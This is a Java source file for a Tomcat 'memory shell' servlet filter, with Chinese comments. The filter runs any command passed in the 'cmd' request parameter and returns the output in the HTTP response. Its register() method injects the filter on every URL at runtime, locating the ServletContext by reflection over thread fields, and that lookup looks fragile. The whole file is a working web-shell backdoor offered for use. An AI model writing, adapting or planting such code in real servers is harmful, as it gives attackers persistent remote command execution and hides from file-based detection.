import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;

public class MemShellFilter implements Filter {

    @Override
    public void init(FilterConfig filterConfig) {}

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {

        HttpServletRequest req = (HttpServletRequest) request;
        String cmd = req.getParameter("cmd");
        if (cmd != null) {
            try {
                Process p = Runtime.getRuntime().exec(cmd);
                java.io.InputStream in = p.getInputStream();
                int a;
                while ((a = in.read()) != -1) {
                    response.getWriter().write((char) a);
                }
                in.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            chain.doFilter(request, response);
        }
    }

    @Override
    public void destroy() {}
    
    public static void register() {
        try {
            ServletContext context = getServletContext();
            Filter filter = new MemShellFilter();

            // 动态注册 Filter
            FilterRegistration.Dynamic registration = context.addFilter("memShell", filter);
            registration.addMappingForUrlPatterns(null, false, "/*");

            System.out.println("[+] MemShellFilter injected.");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 利用当前线程获取 ServletContext（
    private static ServletContext getServletContext() throws Exception {
        // 获取当前线程上下文类加载器
        Thread thread = Thread.currentThread();
        Class<?> threadClazz = thread.getClass();

        Field targetField = null;
        while (threadClazz != null && targetField == null) {
            try {
                targetField = threadClazz.getDeclaredField("target");
            } catch (NoSuchFieldException e) {
                threadClazz = threadClazz.getSuperclass();
            }
        }

        if (targetField == null) throw new IllegalStateException("Cannot find thread target field");

        targetField.setAccessible(true);
        Object target = targetField.get(thread);

        // 查找线程目标是 Runnable 的情况（如：org.apache.catalina.core.StandardContext$StandardContextValve）
        while (target != null) {
            if (target.getClass().getName().contains("org.apache.catalina.core.ApplicationContext")) {
                Method getContext = target.getClass().getDeclaredMethod("getContext");
                getContext.setAccessible(true);
                Object appContext = getContext.invoke(target);

                Field contextField = appContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                Object stdContext = contextField.get(appContext);

                Method getServletContext = stdContext.getClass().getMethod("getServletContext");
                return (ServletContext) getServletContext.invoke(stdContext);
            }

            // 递归尝试获取外层类
            Field enclosingField = null;
            for (Field f : target.getClass().getDeclaredFields()) {
                if (f.getType().getName().contains("Runnable")) {
                    f.setAccessible(true);
                    enclosingField = f;
                    break;
                }
            }
            if (enclosingField == null) break;
            target = enclosingField.get(target);
        }

        throw new IllegalStateException("ServletContext not found.");
    }
}
